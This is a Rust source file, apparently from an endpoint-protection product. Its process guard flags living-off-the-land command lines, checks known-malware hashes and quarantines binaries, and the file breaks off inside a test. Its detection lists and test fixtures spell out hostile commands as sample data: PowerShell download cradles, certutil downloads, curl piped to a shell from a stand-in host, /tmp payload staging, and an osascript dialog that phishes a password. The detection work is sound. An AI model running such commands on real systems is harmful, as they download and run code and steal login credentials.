use crate::ai_policy::{self, Action, Request, Target};
use crate::allowlist;
use crate::bin_ai::{self, BinaryAiScanner};
use crate::config::{AppConfig, Engine};
use crate::known_bad::{self, Digest32};
use crate::logger;
use crate::platform;
use crate::quarantine::{self, Severity, ThreatEvent};
use crate::status::Telemetry;
use std::collections::{HashMap, HashSet, VecDeque};
use std::ffi::OsStr;
use std::fs;
use std::panic::{self, AssertUnwindSafe};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};
use sysinfo::{Pid, Process, ProcessRefreshKind, ProcessesToUpdate, System, UpdateKind};

const POLL_INTERVAL: Duration = Duration::from_millis(400);
const EXIT_WAIT_ROUNDS: u32 = 15;
const EXIT_WAIT_STEP: Duration = Duration::from_millis(200);
const MAX_TRUST_CACHE: usize = 8192;
const CMDLINE_LOG_LIMIT: usize = 512;
/// AI scans per poll stop after this long; the rest wait for the next poll, so command-line
/// (LotL) checks of new processes are never held up by binary analysis.
const AI_SCAN_BUDGET: Duration = Duration::from_millis(250);
const MAX_PENDING_AI: usize = 4096;
pub const LOTL_PROCESSES: &[&str] = &[
    "powershell.exe",
    "pwsh.exe",
    "cmd.exe",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
    "certutil.exe",
];

pub const LOTL_PATTERNS: &[&str] = &[
    "-enc ",
    "-ec ",
    "-encodedcommand",
    "invoke-expression",
    "iex ",
    "iex(",
    "downloadstring",
    "frombase64string",
    "-w hidden",
    "-windowstyle hidden",
    "-ep bypass",
    "certutil -urlcache",
];

/// Returns the first suspicious pattern for a script host, matching case- and
/// whitespace-insensitively with quote/caret obfuscation stripped.
pub fn match_lotl(process_name: &str, cmdline: &str) -> Option<&'static str> {
    let name = process_name.to_ascii_lowercase();
    if !LOTL_PROCESSES.contains(&name.as_str()) {
        return None;
    }
    let stripped: String = cmdline.chars().filter(|c| *c != '"' && *c != '^').collect();
    let mut normalized = stripped
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
        .to_lowercase()
        .replace("certutil.exe ", "certutil ");
    normalized.push(' ');
    LOTL_PATTERNS
        .iter()
        .copied()
        .find(|pattern| normalized.contains(pattern))
}

pub const MACOS_LOTL_PROCESSES: &[&str] = &["zsh", "bash", "sh", "osascript", "curl", "python3"];

pub const MACOS_LOTL_PATTERNS: &[&str] = &[
    "base64 -d",
    "base64 --decode",
    "b64decode",
    "launchctl load",
    "chmod +x /tmp/",
    "chmod +x /private/tmp/",
];

pub const CURL_PIPE_SHELL: &str = "curl | sh";
/// A dialog that asks for text and hides what is typed: how Mac stealers phish the login password.
pub const OSASCRIPT_PASSWORD_PROMPT: &str = "osascript hidden-answer prompt";
/// AppleScript used to fetch or stage something through the shell.
pub const OSASCRIPT_SHELL_FETCH: &str = "osascript do shell script fetch";
/// A shell or python whose own command line merely mentions osascript's shell call: a script
/// that searches for the words, or a wrapper that runs one. Reported, never stopped.
pub const OSASCRIPT_SHELL_MENTION: &str = "shell command line mentioning osascript do shell script";

/// Patterns that raise an alert but never terminate the process.
pub fn is_alert_only(pattern: &str) -> bool {
    pattern == OSASCRIPT_SHELL_MENTION
}

/// What malware does with inline AppleScript. A bare `osascript -e` is not a signal: launchers,
/// installers and automation tools run one constantly, and flagging them all hid the real ones.
/// The rule depends on the process. `osascript` itself shows its whole program in its own
/// command line, so there the shell call with a fetch word is a stop. A shell or python that
/// only mentions it (`git log -S"do shell script"`, a wrapper that redirects `pwd -P >| /tmp/x`)
/// is an alert, unless the line feeds text to osascript (`| osascript`, `osascript <<`): the
/// child's own command line would not show that text.
fn osascript_abuse(process: &str, normalized: &str) -> Option<&'static str> {
    if !normalized.contains("osascript") {
        return None;
    }
    if normalized.contains("hidden answer") {
        return Some(OSASCRIPT_PASSWORD_PROMPT);
    }
    let has = |needles: &[&str]| needles.iter().any(|needle| normalized.contains(needle));
    // "doshellscript" is the same call from JavaScript for Automation (osascript -l JavaScript).
    let runs_shell = has(&["do shell script", "doshellscript"]);
    let fetches = has(&["curl ", "wget ", "base64", "/tmp/", "chmod +x"]);
    if !(runs_shell && fetches) {
        return None;
    }
    if process == "osascript" || has(&["| osascript", "osascript <<"]) {
        Some(OSASCRIPT_SHELL_FETCH)
    } else {
        Some(OSASCRIPT_SHELL_MENTION)
    }
}

/// `curl ... | [sudo] sh|bash|zsh` within one command line (download-and-execute).
fn curl_piped_to_shell(normalized: &str) -> bool {
    let stages: Vec<&str> = normalized.split(" | ").collect();
    let is_fetcher = |token: &str| {
        let tool = token.rsplit('/').next().unwrap_or(token);
        tool == "curl" || tool == "wget"
    };
    let Some(first_fetch) = stages
        .iter()
        .position(|stage| stage.split(' ').any(is_fetcher))
    else {
        return false;
    };
    stages[first_fetch + 1..].iter().any(|stage| {
        let mut tokens = stage.split(' ').filter(|t| !t.is_empty());
        let mut command = tokens.next();
        if command == Some("sudo") {
            command = tokens.next();
        }
        command
            .map(|c| c.rsplit('/').next().unwrap_or(c))
            .is_some_and(|c| matches!(c, "sh" | "bash" | "zsh"))
    })
}

/// macOS counterpart of [`match_lotl`]: shells, osascript, curl and python3 (any 3.x name).
pub fn match_lotl_macos(process_name: &str, cmdline: &str) -> Option<&'static str> {
    let name = process_name.to_lowercase();
    let is_python = name == "python" || name.starts_with("python3");
    if !is_python && !MACOS_LOTL_PROCESSES.contains(&name.as_str()) {
        return None;
    }
    let unquoted: String = cmdline
        .chars()
        .filter(|c| *c != '"' && *c != '\'')
        .collect::<String>()
        .replace('|', " | ");
    let normalized = unquoted
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
        .to_lowercase();
    if curl_piped_to_shell(&normalized) {
        return Some(CURL_PIPE_SHELL);
    }
    // The alert-only result is the weakest: it is returned only when no other rule matched.
    let abuse = osascript_abuse(&name, &normalized);
    if abuse.is_some_and(|a| !is_alert_only(a)) {
        return abuse;
    }
    MACOS_LOTL_PATTERNS
        .iter()
        .copied()
        .find(|pattern| normalized.contains(pattern))
        .or(abuse)
}

/// Both rule sets: Windows script hosts and macOS shells/interpreters have disjoint names.
pub fn check_lotl_command(proc_name: &str, cmdline: &str) -> Option<&'static str> {
    match_lotl(proc_name, cmdline).or_else(|| match_lotl_macos(proc_name, cmdline))
}

fn refresh_kind() -> ProcessRefreshKind {
    ProcessRefreshKind::nothing()
        .with_cmd(UpdateKind::OnlyIfNotSet)
        .with_exe(UpdateKind::OnlyIfNotSet)
        .with_disk_usage()
}

fn process_name(process: &Process) -> String {
    OsStr::new(process.name()).to_string_lossy().into_owned()
}

fn command_line(process: &Process) -> String {
    process
        .cmd()
        .iter()
        .map(|arg| OsStr::new(arg).to_string_lossy().into_owned())
        .collect::<Vec<_>>()
        .join(" ")
}

/// Protection by name alone is spoofable (malware can call itself "dock" or "explorer.exe"), so
/// a name on the allowlist only protects a process whose image is at an OS-critical path or
/// validly signed. With no readable image path only pid 0/1/4 and ourselves are protected (a
/// self-deleting binary must not hide behind a protected name).
/// `signed` is only evaluated for a listed name outside the critical roots.
fn is_protected(
    pid: u32,
    name: &str,
    exe: Option<&Path>,
    signed: impl FnOnce(&Path) -> bool,
) -> bool {
    if matches!(pid, 0 | 1 | 4) || pid == std::process::id() {
        return true;
    }
    if !platform::is_protected_process(pid, name) {
        return false;
    }
    exe.is_some_and(|exe| ai_policy::is_os_critical_path(exe) || signed(exe))
}

/// The file a process runs. The system reports the path it was started by: through a link or
/// with "..", that is not where the file is. Kept as reported when it cannot be resolved, or
/// when it is a protected place as it is written: what was spared stays spared. A relative path
/// is not resolved, because it would be looked up in this program's own folder.
fn real_path(reported: &Path, data_dir: &Path) -> PathBuf {
    if !reported.is_absolute() || ai_policy::is_protected_location(reported, data_dir) {
        return reported.to_path_buf();
    }
    let Ok(real) = fs::canonicalize(reported) else {
        return reported.to_path_buf();
    };
    // Windows answers \\?\C:\x; people and the event log know it as C:\x.
    match real.to_str().and_then(|s| s.strip_prefix(r"\\?\")) {
        Some(plain) if plain.as_bytes().get(1) == Some(&b':') => PathBuf::from(plain),
        _ => real,
    }
}

pub struct ProcessGuard {
    cfg: Arc<AppConfig>,
    scanner: Arc<BinaryAiScanner>,
    telemetry: Arc<Telemetry>,
    sys: System,
    /// pid -> start time, so a recycled PID is treated as a new process.
    seen: HashMap<Pid, u64>,
    trust_cache: HashMap<PathBuf, (bin_ai::FileStamp, bool)>,
    /// Program file -> its SHA-256 when it is on the known-malware list, so each version of a
    /// program is hashed once however often it starts.
    known_cache: HashMap<PathBuf, (known_bad::Stamp, Option<Digest32>)>,
    /// (pid, start time) of everything running when protection started; never killed by the AI.
    baseline: HashSet<(Pid, u64)>,
    /// (pid, was already running when protection started) waiting for a binary AI scan.
    pending_ai: VecDeque<(Pid, bool)>,
    /// The Nex itself and the chain that launched it (shell, terminal, service manager).
    ancestors: HashSet<Pid>,
    primed: bool,
}

impl ProcessGuard {
    pub fn new(
        cfg: Arc<AppConfig>,
        scanner: Arc<BinaryAiScanner>,
        telemetry: Arc<Telemetry>,
    ) -> Self {
        Self {
            cfg,
            scanner,
            telemetry,
            sys: System::new(),
            seen: HashMap::new(),
            trust_cache: HashMap::new(),
            known_cache: HashMap::new(),
            baseline: HashSet::new(),
            pending_ai: VecDeque::new(),
            ancestors: HashSet::new(),
            primed: false,
        }
    }

    fn ancestor_pids(&self) -> HashSet<Pid> {
        let mut out = HashSet::new();
        let mut current = Some(Pid::from_u32(std::process::id()));
        while let Some(pid) = current {
            if !out.insert(pid) {
                break;
            }
            current = self.sys.process(pid).and_then(|p| p.parent());
        }
        out
    }

    pub fn poll(&mut self) {
        if !self.cfg.engine_enabled(Engine::ProcessGuard) {
            // Forget everything so re-enabling inspects what is running at that moment.
            self.seen.clear();
            self.pending_ai.clear();
            self.primed = false;
            self.baseline.clear();
            self.telemetry.processes_watched.store(0, Ordering::Relaxed);
            return;
        }
        let first_poll = !self.primed;
        self.sys
            .refresh_processes_specifics(ProcessesToUpdate::All, true, refresh_kind());
        let mut fresh = Vec::new();
        for (pid, process) in self.sys.processes() {
            let started = process.start_time();
            if self.seen.get(pid) != Some(&started) {
                self.seen.insert(*pid, started);
                fresh.push(*pid);
            }
        }
        let live = self.sys.processes();
        self.seen.retain(|pid, _| live.contains_key(pid));
        self.telemetry
            .processes_watched
            .store(live.len() as u64, Ordering::Relaxed);
        self.telemetry
            .processes_inspected
            .fetch_add(fresh.len() as u64, Ordering::Relaxed);
        if first_poll {
            self.ancestors = self.ancestor_pids();
            self.baseline = self
                .sys
                .processes()
                .iter()
                .map(|(pid, p)| (*pid, p.start_time()))
                .collect();
            self.primed = true;
        }
        // Cheap command-line checks first, for every new process, so a malicious script host
        // is stopped within one poll; binary scans follow within a time budget.
        // Programs that just started go ahead of the backlog of those already running at
        // start-up: only a new program can still be stopped, so it must not wait behind
        // hundreds that will only ever be reported.
        let mut next_new = self
            .pending_ai
            .iter()
            .position(|&(_, at_startup)| at_startup)
            .unwrap_or(self.pending_ai.len());
        for pid in fresh {
            if self.ancestors.contains(&pid) || self.inspect_command(pid) {
                continue;
            }
            if first_poll {
                self.pending_ai.push_back((pid, true));
            } else {
                self.pending_ai.insert(next_new, (pid, false));
                next_new += 1;
            }
        }
        while self.pending_ai.len() > MAX_PENDING_AI {
            self.pending_ai.pop_back();
        }
        let started = Instant::now();
        while started.elapsed() < AI_SCAN_BUDGET {
            let Some((pid, preexisting)) = self.pending_ai.pop_front() else {
                break;
            };
            self.inspect_binary(pid, preexisting);
        }
    }

    /// LotL command-line check. True when the process needs nothing more (handled, protected
    /// or gone).
    fn inspect_command(&mut self, pid: Pid) -> bool {
        let Some(process) = self.sys.process(pid) else {
            return true;
        };
        let name = process_name(process);
        let exe = process.exe().map(Path::to_path_buf);
        if is_protected(pid.as_u32(), &name, exe.as_deref(), |e| self.is_trusted(e)) {
            return true;
        }
        let Some(process) = self.sys.process(pid) else {
            return true;
        };
        let cmdline = command_line(process);
        if let Some(pattern) = check_lotl_command(&name, &cmdline) {
            self.respond_lotl(pid, &name, &cmdline, pattern);
            // An alert-only match proves nothing: the program must still reach the list and AI checks.
            return !is_alert_only(pattern);
        }
        false
    }

    fn inspect_binary(&mut self, pid: Pid, preexisting: bool) {
        let listed = self.cfg.known_bad_active();
        let ai = self.cfg.engine_enabled(Engine::BinAi);
        if !listed && !ai {
            return;
        }
        let Some(process) = self.sys.process(pid) else {
            return;
        };
        let name = process_name(process);
        let Some(reported) = process.exe().map(Path::to_path_buf) else {
            return;
        };
        let exe = real_path(&reported, &self.cfg.base_dir);
        if !crate::engine::is_regular_file(&exe) {
            return;
        }
        // The list first: a match is certain, and it applies to signed programs too (malware
        // is often signed with a stolen certificate), which the AI skips.
        if listed && self.respond_known_bad(pid, &name, &exe, preexisting) {
            return;
        }
        // Trusted by either spelling is trusted.
        if ai && !(reported != exe && self.is_trusted(&reported)) {
            self.scan_executable(pid, &name, &exe, preexisting);
        }
    }

    /// The program's SHA-256 when it is on the known-malware list.
    fn known_bad_digest(&mut self, exe: &Path) -> Option<Digest32> {
        let stamp = fs::metadata(exe).ok().and_then(|m| known_bad::stamp(&m))?;
        if let Some(&(cached, hit)) = self.known_cache.get(exe) {
            if cached == stamp {
                return hit;
            }
        }
        let hit = known_bad::hash_file(exe, known_bad::MAX_HASH_BYTES)
            .filter(|digest| self.cfg.known_bad.contains(digest));
        // A match is only remembered under a stamp that cannot be forged (see Stamp::Weak).
        if hit.is_none() || matches!(stamp, known_bad::Stamp::Strong(_)) {
            if self.known_cache.len() >= MAX_TRUST_CACHE {
                self.known_cache.clear();
            }
            self.known_cache.insert(exe.to_path_buf(), (stamp, hit));
        }
        hit
    }

    /// True when the program is known malware (and has been dealt with and logged).
    fn respond_known_bad(&mut self, pid: Pid, name: &str, exe: &Path, preexisting: bool) -> bool {
        let Some(digest) = self.known_bad_digest(exe) else {
            return false;
        };
        let details = format!(
            "{} pid={} name={name}",
            self.cfg.known_bad.describe(&digest),
            pid.as_u32()
        );
        let decision = known_bad::decide(&self.cfg, exe, Target::Process { preexisting }, &details);
        self.respond(
            known_bad::THREAT_TYPE,
            Severity::Critical,
            exe,
            decision,
            details,
            None,
        );
        true
    }

    fn respond_lotl(&mut self, pid: Pid, name: &str, cmdline: &str, pattern: &str) {
        let action = if is_alert_only(pattern) {
            "ALERT_ONLY: command line is only suspicious, not conclusive; alert only".to_string()
        } else if self.cfg.is_dry_run() {
            "DRY_RUN: would terminate process".to_string()
        } else if self.sys.process(pid).is_some_and(|p| p.kill()) {
            "TERMINATED".to_string()
        } else {
            "TERMINATE_FAILED".to_string()
        };
        quarantine::record_event(
            &self.cfg,
            ThreatEvent::new(
                "LOTL_SCRIPT",
                Severity::High,
                format!("{name} (pid {})", pid.as_u32()),
                action,
                format!(
                    "pattern=\"{}\" cmdline=\"{}\"",
                    pattern.trim(),
                    quarantine::truncate_chars(cmdline, CMDLINE_LOG_LIMIT)
                ),
            ),
        );
    }

    fn is_trusted(&mut self, exe: &Path) -> bool {
        let Some(stamp) = fs::metadata(exe).ok().and_then(|m| bin_ai::file_stamp(&m)) else {
            return platform::is_trusted_binary(exe); // no tamper-resistant stamp: never cache
        };
        if let Some(&(cached, trusted)) = self.trust_cache.get(exe) {
            if cached == stamp {
                return trusted;
            }
        }
        let trusted = platform::is_trusted_binary(exe);
        if self.trust_cache.len() >= MAX_TRUST_CACHE {
            self.trust_cache.clear();
        }
        self.trust_cache.insert(exe.to_path_buf(), (stamp, trusted));
        trusted
    }

    fn scan_executable(&mut self, pid: Pid, name: &str, exe: &Path, preexisting: bool) {
        if self.is_trusted(exe) {
            return;
        }
        let judged = allowlist::stamp_of(exe);
        let Some(score) = self.scanner.scan_file(exe) else {
            return;
        };
        let threshold = ai_policy::effective_threshold(self.cfg.ai_threshold);
        if score.is_nan() || score < threshold {
            return;
        }
        let (digest, allowed) = allowlist::check(&self.cfg, exe, judged);
        if allowed {
            return;
        }
        let details = format!(
            "pid={} name={name} {}",
            pid.as_u32(),
            self.scanner.explain(exe, score, threshold)
        );
        let decision = ai_policy::decide(&Request {
            path: exe,
            score,
            threshold: self.cfg.ai_threshold,
            trusted: false,
            dry_run: self.cfg.is_dry_run(),
            target: Target::Process { preexisting },
            explanation: &details,
            data_dir: &self.cfg.base_dir,
        });
        self.respond(
            "MALWARE_AI_PROCESS",
            Severity::High,
            exe,
            decision,
            details,
            digest,
        );
    }

    /// Carries out a verdict on a running program and logs it. `alert_severity` is the
    /// severity of an event that only alerts; anything acted on is critical.
    fn respond(
        &mut self,
        threat_type: &str,
        alert_severity: Severity,
        exe: &Path,
        decision: Action,
        details: String,
        sha256: Option<Digest32>,
    ) {
        let (severity, action) = match decision {
            Action::Ignore => return,
            Action::Alert(why) => (alert_severity, format!("ALERT_ONLY: {why}")),
            Action::WouldTerminateAndQuarantine | Action::WouldQuarantine => (
                Severity::Critical,
                "DRY_RUN: would terminate process and quarantine executable".to_string(),
            ),
            Action::Quarantine | Action::TerminateAndQuarantine => {
                let killed = self.kill_all_with_exe(exe);
                self.wait_for_exit(&killed);
                let quarantined =
                    match quarantine::quarantine_file(exe, &self.cfg, threat_type, &details) {
                        Ok(meta) => format!("QUARANTINED id={}", meta.id),
                        Err(e) => format!("QUARANTINE_FAILED: {e}"),
                    };
                (
                    Severity::Critical,
                    format!("TERMINATED {} process(es); {quarantined}", killed.len()),
                )
            }
        };
        quarantine::record_event(
            &self.cfg,
            ThreatEvent::new(
                threat_type,
                severity,
                exe.display().to_string(),
                action,
                details,
            )
            .with_sha256(sha256),
        );
    }

    fn kill_all_with_exe(&mut self, exe: &Path) -> Vec<Pid> {
        let target = platform::path_key(exe);
        let candidates: Vec<(Pid, u64)> = self
            .sys
            .processes()
            .iter()
            .filter(|(pid, process)| {
                process.exe().is_some_and(|reported| {
                    platform::path_key(&real_path(reported, &self.cfg.base_dir)) == target
                }) && !self.ancestors.contains(pid)
                    && !self.baseline.contains(&(**pid, process.start_time()))
                    && !is_protected(pid.as_u32(), &process_name(process), process.exe(), |_| {
                        false
                    })
            })
            .map(|(pid, process)| (*pid, process.start_time()))
            .collect();
        let mut killed = Vec::new();
        for (pid, started) in candidates {
            // The list may be stale: re-read this pid and kill only the same process instance
            // (a recycled PID has a different start time).
            self.sys
                .refresh_processes(ProcessesToUpdate::Some(&[pid]), true);
            if self
                .sys
                .process(pid)
                .is_some_and(|p| p.start_time() == started && p.kill())
            {
                killed.push(pid);
            }
        }
        killed
    }

    fn wait_for_exit(&mut self, pids: &[Pid]) {
        if pids.is_empty() {
            return;
        }
        for _ in 0..EXIT_WAIT_ROUNDS {
            self.sys
                .refresh_processes(ProcessesToUpdate::Some(pids), true);
            if pids.iter().all(|pid| self.sys.process(*pid).is_none()) {
                return;
            }
            thread::sleep(EXIT_WAIT_STEP);
        }
    }
}

pub fn run(
    cfg: Arc<AppConfig>,
    scanner: Arc<BinaryAiScanner>,
    telemetry: Arc<Telemetry>,
    shutdown: Arc<AtomicBool>,
) {
    let mut guard = ProcessGuard::new(cfg, scanner, telemetry);
    logger::info("process guard active");
    while !shutdown.load(Ordering::SeqCst) {
        if panic::catch_unwind(AssertUnwindSafe(|| guard.poll())).is_err() {
            logger::error("process guard recovered from a panic");
        }
        thread::sleep(POLL_INTERVAL);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn protected_names_do_not_protect_look_alikes() {
        let me = std::process::id();
        // Named like a system process but running from a user folder and unsigned.
        assert!(!is_protected(
            me + 1,
            "explorer.exe",
            Some(Path::new("C:\\Users\\x\\explorer.exe")),
            |_| false
        ));
        assert!(!is_protected(
            me + 1,
            "dock",
            Some(Path::new("/tmp/dock")),
            |_| false
        ));
        // The real thing, or a validly signed one, stays protected.
        assert!(is_protected(
            me + 1,
            "dock",
            Some(Path::new(
                "/System/Library/CoreServices/Dock.app/Contents/MacOS/Dock"
            )),
            |_| false
        ));
        assert!(is_protected(
            me + 1,
            "dock",
            Some(Path::new("/tmp/dock")),
            |_| true
        ));
        // Kernel tasks with no image path, and our own pid, keep protection.
        assert!(!is_protected(me + 1, "kernel_task", None, |_| false)); // no path: no name protection
        assert!(is_protected(1, "kernel_task", None, |_| false));
        assert!(is_protected(me, "anything", None, |_| false));
        assert!(!is_protected(me + 1, "random", None, |_| true));
    }

    #[test]
    fn flags_encoded_and_download_cradles() {
        assert_eq!(
            match_lotl("powershell.exe", "powershell.exe -NoP -Enc SQBFAFgA"),
            Some("-enc ")
        );
        assert_eq!(
            match_lotl("PowerShell.EXE", "powershell -EncodedCommand ZQBjAGgAbwA="),
            Some("-encodedcommand")
        );
        assert!(match_lotl(
            "pwsh.exe",
            "pwsh -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')\""
        )
        .is_some());
        assert!(match_lotl("powershell.exe", "powershell -W Hidden -File x.ps1").is_some());
        assert!(match_lotl("powershell.exe", "powershell -ep   bypass -f a.ps1").is_some());
        assert!(match_lotl(
            "powershell.exe",
            "powershell [Convert]::FromBase64String($s)"
        )
        .is_some());
        assert!(match_lotl("powershell.exe", "powershell -c iex").is_some());
    }

    #[test]
    fn flags_cmd_and_certutil_variants() {
        assert_eq!(
            match_lotl(
                "cmd.exe",
                "cmd /c c^e^r^t^u^t^i^l -urlcache -split -f http://x/a.exe"
            ),
            Some("certutil -urlcache")
        );
        assert_eq!(
            match_lotl(
                "certutil.exe",
                "\"C:\\Windows\\System32\\certutil.exe\" -urlcache -f http://x/p a.exe"
            ),
            Some("certutil -urlcache")
        );
        assert!(match_lotl("mshta.exe", "mshta vbscript:Execute(\"x\") -w hidden").is_some());
    }

    #[test]
    fn ignores_benign_commands_and_other_processes() {
        assert_eq!(
            match_lotl("powershell.exe", "powershell -NoProfile -File build.ps1"),
            None
        );
        assert_eq!(match_lotl("cmd.exe", "cmd /c npm run build"), None);
        assert_eq!(
            match_lotl("powershell.exe", "powershell Get-ChildItem -Recurse"),
            None
        );
        assert_eq!(match_lotl("notepad.exe", "notepad -enc x"), None);
        assert_eq!(match_lotl("code.exe", "code --windowstyle hidden"), None);
    }

    #[test]
    fn macos_flags_download_and_decode_stagers() {
        assert_eq!(
            match_lotl_macos("bash", "bash -c 'curl -fsSL http://x/p.sh | sh'"),
            Some(CURL_PIPE_SHELL)
        );
        assert_eq!(
            match_lotl_macos("zsh", "zsh -c curl -s http://x|sudo /bin/bash"),
            Some(CURL_PIPE_SHELL)
        );
        assert_eq!(
            match_lotl_macos("sh", "sh -c echo ZWNobyBoaQ== | base64 -D | sh"),
            Some("base64 -d")
        );
        assert_eq!(
            match_lotl_macos(
                "osascript",
                "osascript -e 'display dialog \"macOS needs your password\" default answer \"\" with hidden answer'"
            ),
            Some(OSASCRIPT_PASSWORD_PROMPT)
        );
        assert_eq!(
            match_lotl_macos(
                "osascript",
                "osascript -e 'do shell script \"curl -s http://x/p -o /tmp/p\"'"
            ),
            Some(OSASCRIPT_SHELL_FETCH)
        );
        assert_eq!(
            match_lotl_macos(
                "osascript",
                "osascript -l JavaScript -e 'Application.currentApplication().doShellScript(\"curl http://x | sh\")'"
            ),
            Some(OSASCRIPT_SHELL_FETCH)
        );
        assert_eq!(
            match_lotl_macos(
                "osascript",
                "osascript -l JavaScript -e 'app.doShellScript(\"chmod +x /tmp/a\")'"
            ),
            Some(OSASCRIPT_SHELL_FETCH)
        );
        // Ordinary automation is not a threat: quitting an app, asking System Events a question,
        // or a plain shell command with no download in it.
        for benign in [
            "osascript -e 'tell application id \"com.thenex.edr\" to quit'",
            "osascript -e 'tell application \"System Events\" to get name of every process'",
            "osascript -e 'do shell script \"id\"'",
            "osascript -e 'display dialog \"Done\"'",
        ] {
            assert_eq!(match_lotl_macos("osascript", benign), None, "{benign}");
            assert_eq!(
                match_lotl_macos("zsh", &format!("zsh -c {benign}")),
                None,
                "{benign}"
            );
        }
        assert_eq!(
            match_lotl_macos(
                "bash",
                "bash -c launchctl load ~/Library/LaunchAgents/x.plist"
            ),
            Some("launchctl load")
        );
        assert_eq!(
            match_lotl_macos("sh", "sh -c chmod +x /tmp/payload && /tmp/payload"),
            Some("chmod +x /tmp/")
        );
        assert_eq!(
            match_lotl_macos(
                "Python3.12",
                "python3 -c import base64;exec(base64.b64decode('aW1wb3J0IG9z'))"
            ),
            Some("b64decode")
        );
    }

    /// `osascript_abuse` and `match_lotl_macos` exactly as released in 85e35b4 (the others they
    /// call, `curl_piped_to_shell` and the pattern list, have not changed since).
    fn reference_match_85e35b4(process_name: &str, cmdline: &str) -> Option<&'static str> {
        fn old_osascript_abuse(normalized: &str) -> Option<&'static str> {
            if !normalized.contains("osascript") {
                return None;
            }
            if normalized.contains("hidden answer") {
                return Some(OSASCRIPT_PASSWORD_PROMPT);
            }
            let fetches = ["curl ", "wget ", "base64", "/tmp/", "chmod +x"]
                .iter()
                .any(|needle| normalized.contains(needle));
            let runs_shell =
                normalized.contains("do shell script") || normalized.contains("doshellscript");
            (runs_shell && fetches).then_some(OSASCRIPT_SHELL_FETCH)
        }
        let name = process_name.to_lowercase();
        let is_python = name == "python" || name.starts_with("python3");
        if !is_python && !MACOS_LOTL_PROCESSES.contains(&name.as_str()) {
            return None;
        }
        let unquoted: String = cmdline
            .chars()
            .filter(|c| *c != '"' && *c != '\'')
            .collect::<String>()
            .replace('|', " | ");
        let normalized = unquoted
            .split_whitespace()
            .collect::<Vec<_>>()
            .join(" ")
            .to_lowercase();
        if curl_piped_to_shell(&normalized) {
            return Some(CURL_PIPE_SHELL);
        }
        if let Some(abuse) = old_osascript_abuse(&normalized) {
            return Some(abuse);
        }
        MACOS_LOTL_PATTERNS
            .iter()
            .copied()
            .find(|pattern| normalized.contains(pattern))
    }

    #[derive(Debug, PartialEq, Clone, Copy)]
    enum Outcome {
        Terminate,
        Alert,
        None,
    }

    fn outcome(name: &str, line: &str) -> Outcome {
        let found = match_lotl_macos(name, line);
        assert_eq!(found, check_lotl_command(name, line), "{name}: {line}");
        match found {
            None => Outcome::None,
            Some(pattern) if is_alert_only(pattern) => Outcome::Alert,
            Some(_) => Outcome::Terminate,
        }
    }

    /// (the process the line runs under, its command line)
    const MALICIOUS: &[(&str, &str)] = &[
        ("osascript", "osascript -e 'do shell script \"nohup /tmp/.h &\"'"),
        ("osascript", "osascript -e 'do shell script \"curl -s http://x/p -o /tmp/p\"'"),
        ("osascript", "osascript -e 'do shell script \"wget http://x -O /tmp/p\"'"),
        ("osascript", "osascript -e 'do shell script \"echo aQ== | base64 -D > /tmp/p\"'"),
        ("osascript", "osascript -e 'do shell script \"chmod +x /tmp/p\"'"),
        ("osascript", "osascript -e 'do shell script \"/tmp/p\" with administrator privileges'"),
        ("osascript", "osascript -e 'do shell script \"launchctl load /tmp/x.plist\"'"),
        ("osascript", "osascript -l JavaScript -e 'app.doShellScript(\"curl http://x | sh\")'"),
        ("osascript", "osascript -l JavaScript -e 'app.doShellScript(\"/tmp/x\")'"),
        ("osascript", "osascript -e 'display dialog \"Password\" default answer \"\" with hidden answer'"),
        ("sh", "sh -c 'echo \"do shell script \\\"curl http://x -o /tmp/p\\\"\" | osascript'"),
        ("bash", "bash -c \"osascript <<< 'do shell script \\\"/tmp/x\\\"'\""),
        ("python3", "python3 -c \"import os; os.system('echo do shell script curl x | osascript')\""),
        ("sh", "sh -c 'curl http://x | sh # osascript do shell script /tmp/'"),
        ("sh", "sh -c 'launchctl load x.plist # osascript do shell script /tmp/'"),
        ("zsh", "zsh -c 'osascript -e \"display dialog \\\"Password\\\" default answer \\\"\\\" with hidden answer\"'"),
        ("bash", "bash -c 'chmod +x /tmp/payload && /tmp/payload'"),
    ];

    const BENIGN: &[(&str, &str, Outcome)] = &[
        (
            "zsh",
            "zsh -c source /x/snapshot.sh && eval 'chmod 644 notes.txt; osascript -e \"do shell script \\\"id\\\"\"' && pwd -P >| /tmp/claude-1-cwd",
            Outcome::Alert,
        ),
        ("zsh", "zsh -c 'osascript -e \"do shell script \\\"id\\\" with administrator privileges\"' && pwd -P >| /tmp/claude-1-cwd", Outcome::Alert),
        ("bash", "bash -c 'osascript -e \"do shell script \\\"id\\\"\" && cat /tmp/x'", Outcome::Alert),
        ("zsh", "zsh -c 'grep -r doShellScript ~/scripts | grep /tmp/ ; echo osascript'", Outcome::Alert),
        ("bash", "bash -c 'echo see osascript do shell script docs, notes in /tmp/notes'", Outcome::Alert),
        ("python3", "python3 -c \"print('osascript do shell script curl x')\"", Outcome::Alert),
        ("zsh", "zsh -c 'git log -S\"do shell script\" && xattr -l x'", Outcome::None),
        ("bash", "bash /tmp/build.sh && osascript -e 'display notification \"done\"'", Outcome::None),
        ("zsh", "zsh -c 'rg \"do shell script\" | grep curl'", Outcome::None),
        ("zsh", "zsh -c git commit -m 'document osascript do shell script'", Outcome::None),
        ("zsh", "zsh -c 'osascript -e \"tell application \\\"Finder\\\" to quit\"'", Outcome::None),
        ("python3", "python3 build.py --notify osascript", Outcome::None),
        ("zsh", "zsh -c cargo build", Outcome::None),
        ("sh", "sh -c 'curl -s https://x/sums.txt | shasum -a 256 -c'", Outcome::None),
        ("curl", "curl -fsSL -o setup.pkg https://example.com/setup.pkg", Outcome::None),
        ("osascript", "osascript -e 'do shell script \"id\"'", Outcome::None),
        ("osascript", "osascript -e 'tell application \"System Events\" to get name of every process'", Outcome::None),
        ("osascript", "osascript -e 'display dialog \"Done\"'", Outcome::None),
        ("osascript", "osascript /tmp/a.scpt", Outcome::None),
        ("osascript", "osascript - The Nex: ZIP_BOMB (HIGH) /tmp/a.zip", Outcome::None),
    ];

    #[test]
    fn the_do_shell_script_rule_depends_on_the_process_that_runs_the_line() {
        assert!(MALICIOUS.len() >= 12 && BENIGN.len() >= 12);
        for (name, line) in MALICIOUS {
